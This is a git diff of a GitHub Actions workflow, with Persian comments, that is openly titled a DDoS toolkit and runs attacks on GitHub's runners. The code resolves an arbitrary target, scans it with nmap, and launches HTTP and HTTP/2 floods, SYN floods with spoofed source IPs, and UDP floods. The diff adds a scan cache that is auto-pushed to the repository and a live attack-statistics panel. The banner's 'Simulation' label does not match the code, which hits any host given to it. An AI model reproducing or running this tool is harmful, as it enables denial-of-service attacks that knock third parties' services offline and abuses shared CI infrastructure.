@@ -1,4 +1,4 @@
-name: Advanced DDoS Toolkit with Auto-Discovery
+name: Advanced DDoS Toolkit with Cache Memory
 
 on:
   workflow_dispatch:
@@ -29,17 +29,30 @@ on:
         required: true
         default: '50'
 
+permissions:
+  contents: write  # برای push کردن فایل‌های کش
+
 jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: Install Tools
+      - name: دریافت کدها (برای دسترسی به فایل‌های کش)
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: تنظیمات Git
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+
+      - name: نصب ابزارها
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
           pip3 install aiohttp rich httpx websockets scapy python-nmap
 
-      - name: Execute Reconnaissance & Attack
+      - name: اجرای عملیات شناسایی و حمله
         env:
           TARGET_HOST: ${{ github.event.inputs.target }}
           TARGET_PORT: ${{ github.event.inputs.port }}
@@ -47,13 +60,90 @@ jobs:
           DURATION: ${{ github.event.inputs.duration }}
           THREADS: ${{ github.event.inputs.threads }}
         run: |
-          python3 - << 'PYEOF'
-          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp
+          python3 << 'PYEOF'
+          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json
+          from datetime import datetime, timedelta
+          from pathlib import Path
           from rich.console import Console
+          from rich.table import Table
+          from rich.live import Live
+          from rich.panel import Panel
 
           console = Console()
 
-          # ========== ۱. تبدیل دامنه به IP ==========
+          # ========== پیکربندی ==========
+          CACHE_DIR = Path("scan_results")
+          CACHE_FILE = CACHE_DIR / "targets_cache.json"
+          CACHE_VALID_HOURS = 24  # عمر مفید کش به ساعت
+
+          # ========== ۱. مدیریت کش ==========
+          def load_cache():
+              """بارگذاری کش از فایل JSON"""
+              if not CACHE_FILE.exists():
+                  return {}
+              try:
+                  with open(CACHE_FILE, 'r') as f:
+                      return json.load(f)
+              except:
+                  return {}
+
+          def save_cache(cache_data):
+              """ذخیره کش در فایل JSON"""
+              CACHE_DIR.mkdir(parents=True, exist_ok=True)
+              with open(CACHE_FILE, 'w') as f:
+                  json.dump(cache_data, f, indent=2)
+
+          def get_cached_scan(target_ip):
+              """بررسی وجود نتیجه اسکن معتبر برای یک IP"""
+              cache = load_cache()
+              if target_ip in cache:
+                  entry = cache[target_ip]
+                  scan_time = datetime.fromisoformat(entry['timestamp'])
+                  if datetime.now() - scan_time < timedelta(hours=CACHE_VALID_HOURS):
+                      console.print(f"[green]✅ نتیجه کش معتبر برای {target_ip} پیدا شد (عمر: {(datetime.now() - scan_time).seconds // 3600} ساعت)[/green]")
+                      return entry['ports']
+                  else:
+                      console.print(f"[yellow]⚠️ کش برای {target_ip} منقضی شده است. اسکن مجدد...[/yellow]")
+              return None
+
+          def update_cache(target_ip, target_host, open_ports):
+              """به‌روزرسانی کش با نتایج جدید"""
+              cache = load_cache()
+              cache[target_ip] = {
+                  'host': target_host,
+                  'timestamp': datetime.now().isoformat(),
+                  'ports': open_ports
+              }
+              save_cache(cache)
+              # کامیت و پوش خودکار
+              os.system(f"git add {CACHE_FILE} && git commit -m 'Update scan cache for {target_host}' && git push 2>/dev/null || true")
+              console.print("[green]📥 نتایج اسکن در کش ذخیره و به مخزن ارسال شد.[/green]")
+
+          # ========== شمارنده‌های حمله ==========
+          stats = {
+              'sent': 0,
+              'success': 0,
+              'failed': 0,
+              'start_time': time.time(),
+              'lock': threading.Lock()
+          }
+
+          def increment(key, amount=1):
+              with stats['lock']:
+                  stats[key] += amount
+
+          def get_stats():
+              with stats['lock']:
+                  elapsed = time.time() - stats['start_time']
+                  return {
+                      'sent': stats['sent'],
+                      'success': stats['success'],
+                      'failed': stats['failed'],
+                      'elapsed': elapsed,
+                      'rps': stats['sent'] / elapsed if elapsed > 0 else 0
+                  }
+
+          # ========== ۲. توابع شبکه ==========
           def resolve_target(target):
               for prefix in ['https://', 'http://', 'ftp://']:
                   if target.startswith(prefix):
@@ -64,9 +154,8 @@ jobs:
               except socket.gaierror:
                   return None
 
-          # ========== ۲. اسکن پورت‌های باز با Nmap (استفاده از -sT به جای -sS) ==========
           def scan_open_ports(ip, port_range='1-10000'):
-              console.print(f"🔍 شروع اسکن روی {ip}...")
+              console.print(f"[cyan]🔍 شروع اسکن روی {ip}...[/cyan]")
               nm = nmap.PortScanner()
               nm.scan(hosts=ip, arguments=f'-sT -sV -p {port_range} --min-rate 1000')
               open_ports = []
@@ -78,7 +167,7 @@ jobs:
                               open_ports.append({'port': port, 'service': service})
               return open_ports
 
-          # ========== ۳. توابع کمکی ==========
+          # ========== بقیه توابع کمکی و موتورهای حمله (بدون تغییر) ==========
           USER_AGENTS = [
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
@@ -88,16 +177,17 @@ jobs:
           def get_random_ua():
               return random.choice(USER_AGENTS)
 
-          # ========== ۴. موتورهای حمله ==========
           async def http_worker(url):
               headers = {"User-Agent": get_random_ua()}
               async with aiohttp.ClientSession() as session:
                   while True:
                       try:
                           async with session.get(url, headers=headers, timeout=5) as r:
-                              console.print(f"[dim]✓ {r.status}[/dim]", end="")
+                              increment('sent')
+                              if r.status < 500: increment('success')
+                              else: increment('failed')
                       except:
-                          console.print("[dim]✗[/dim]", end="")
+                          increment('sent'); increment('failed')
 
           def run_http_flood(url, workers):
               loop = asyncio.new_event_loop()
@@ -112,9 +202,11 @@ jobs:
                   while True:
                       try:
                           r = await client.get(url, headers=headers, timeout=5)
-                          console.print(f"[dim]✓ {r.status_code}[/dim]", end="")
+                          increment('sent')
+                          if r.status_code < 500: increment('success')
+                          else: increment('failed')
                       except:
-                          console.print("[dim]✗[/dim]", end="")
+                          increment('sent'); increment('failed')
 
           def run_http2_flood(url, workers):
               loop = asyncio.new_event_loop()
@@ -128,78 +220,121 @@ jobs:
                   src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                   pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
                   send(pkt, verbose=False)
+                  increment('sent'); increment('success')
 
           def run_syn_flood(ip, port, workers):
               for _ in range(workers):
-                  t = threading.Thread(target=syn_worker, args=(ip, port))
-                  t.daemon = True
-                  t.start()
+                  t = threading.Thread(target=syn_worker, args=(ip, port)); t.daemon = True; t.start()
 
           def udp_worker(ip, port):
               sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
               while True:
-                  sock.sendto(random._urandom(1024), (ip, port))
+                  try:
+                      sock.sendto(random._urandom(1024), (ip, port))
+                      increment('sent'); increment('success')
+                  except:
+                      increment('sent'); increment('failed')
 
           def run_udp_flood(ip, port, workers):
               for _ in range(workers):
-                  t = threading.Thread(target=udp_worker, args=(ip, port))
-                  t.daemon = True
-                  t.start()
+                  t = threading.Thread(target=udp_worker, args=(ip, port)); t.daemon = True; t.start()
 
-          # ========== ۵. اجرای اصلی ==========
+          def stats_display():
+              s = get_stats()
+              table = Table(show_header=False, box=None, padding=(0,2))
+              table.add_column("متریک", style="cyan"); table.add_column("مقدار", style="bold white")
+              table.add_row("📤 بسته‌های ارسالی", f"{s['sent']:,}")
+              table.add_row("✅ موفق", f"{s['success']:,}")
+              table.add_row("❌ ناموفق", f"{s['failed']:,}")
+              table.add_row("⚡ نرخ (درخواست/ثانیه)", f"{s['rps']:.0f}")
+              table.add_row("⏱️ زمان سپری‌شده", f"{s['elapsed']:.1f}s")
+              return Panel(table, title="[bold green]🔥 آمار زنده[/bold green]", border_style="green")
+
+          # ========== ۶. اجرای اصلی ==========
           TARGET = os.environ["TARGET_HOST"]
           ATTACK = os.environ["ATTACK_TYPE"]
           DURATION = int(os.environ["DURATION"])
           THREADS = int(os.environ["THREADS"])
           PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
 
+          console.print(f"[bold red]╔══════════════════════════════════════╗[/bold red]")
+          console.print(f"[bold red]║   🛡️  DDoS Simulation Toolkit      ║[/bold red]")
+          console.print(f"[bold red]╚══════════════════════════════════════╝[/bold red]")
+
           ip = resolve_target(TARGET)
           if ip is None:
               console.print("[red]❌ نمی‌تونم IP هدف رو پیدا کنم.[/red]")
               sys.exit(1)
-          console.print(f"🎯 IP هدف: {ip}")
+          console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
 
-          target_ports = []
-          if PORT_ARG == 'auto':
-              open_ports = scan_open_ports(ip)
-              if not open_ports:
-                  console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
-                  sys.exit(1)
-              # انتخاب فقط پورت‌های HTTP/HTTPS برای حملات لایه ۷
-              if ATTACK in ('l7_http_flood', 'l7_http2_flood'):
-                  for p in open_ports:
-                      if 'http' in p['service'].lower() or 'ssl' in p['service'].lower():
-                          target_ports.append(p['port'])
-                  if not target_ports:
-                      console.print("[red]❌ هیچ سرویس HTTP/HTTPS برای حمله لایه ۷ پیدا نشد.[/red]")
+          # ---------- بررسی کش ----------
+          target_ports = None
+          cached_ports = get_cached_scan(ip)
+          if cached_ports is not None:
+              if PORT_ARG == 'auto':
+                  target_ports = cached_ports
+                  console.print("[green]♻️ استفاده از پورت‌های کش‌شده.[/green]")
+
+          # اگر کش نبود یا کاربر دستی پورت داده بود
+          if target_ports is None:
+              if PORT_ARG == 'auto':
+                  open_ports = scan_open_ports(ip)
+                  if not open_ports:
+                      console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
                       sys.exit(1)
+                  # ذخیره در کش
+                  update_cache(ip, TARGET, open_ports)
+                  
+                  # انتخاب پورت‌های HTTP/HTTPS برای حملات لایه ۷
+                  if ATTACK in ('l7_http_flood', 'l7_http2_flood'):
+                      for p in open_ports:
+                          if 'http' in p['service'].lower() or 'ssl' in p['service'].lower():
+                              target_ports.append(p['port'])
+                      if not target_ports:
+                          console.print("[red]❌ هیچ سرویس HTTP/HTTPS پیدا نشد.[/red]")
+                          sys.exit(1)
+                  else:
+                      target_ports = [p['port'] for p in open_ports]
               else:
-                  target_ports = [p['port'] for p in open_ports]
-          else:
-              target_ports = [int(os.environ["TARGET_PORT"])]
+                  target_ports = [int(os.environ["TARGET_PORT"])]
 
-          console.print(f"🎯 پورت‌های هدف: {target_ports}")
+          console.print(f"🎯 پورت‌های هدف: [bold yellow]{target_ports}[/bold yellow]")
+          console.print(f"⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]")
+          console.print(f"⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n")
 
-          # اجرای حمله روی هر پورت
+          # اجرای حمله
           for port in target_ports:
-              console.print(f"🚀 شروع حمله {ATTACK} روی {ip}:{port}")
+              console.print(f"[bold green]🚀 شروع حمله {ATTACK} روی {ip}:{port}[/bold green]")
               if ATTACK == 'l7_http_flood':
                   scheme = "https" if port == 443 else "http"
                   url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_http_flood, args=(url, 5))
-                      t.daemon = True; t.start()
+                      t = threading.Thread(target=run_http_flood, args=(url, 5)); t.daemon = True; t.start()
               elif ATTACK == 'l7_http2_flood':
                   scheme = "https" if port == 443 else "http"
                   url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_http2_flood, args=(url, 5))
-                      t.daemon = True; t.start()
+                      t = threading.Thread(target=run_http2_flood, args=(url, 5)); t.daemon = True; t.start()
               elif ATTACK == 'l4_syn_flood':
                   run_syn_flood(ip, port, THREADS)
               elif ATTACK == 'l4_udp_flood':
                   run_udp_flood(ip, port, THREADS)
 
-          time.sleep(DURATION)
-          console.print("[green]✅ عملیات پایان یافت.[/green]")
+          stats['start_time'] = time.time()
+          with Live(stats_display(), refresh_per_second=2, console=console) as live:
+              end_time = time.time() + DURATION
+              while time.time() < end_time:
+                  time.sleep(0.5)
+                  live.update(stats_display())
+
+          final = get_stats()
+          console.print("\n[bold green]✅ عملیات پایان یافت.[/bold green]")
+          summary = Table(title="📊 گزارش نهایی", show_header=True)
+          summary.add_column("متریک", style="cyan"); summary.add_column("مقدار", style="bold white")
+          summary.add_row("کل بسته‌ها", f"{final['sent']:,}")
+          summary.add_row("موفق", f"{final['success']:,}")
+          summary.add_row("ناموفق", f"{final['failed']:,}")
+          summary.add_row("نرخ (RPS)", f"{final['rps']:.0f}")
+          summary.add_row("زمان کل", f"{final['elapsed']:.1f}s")
+          console.print(summary)
           PYEOF
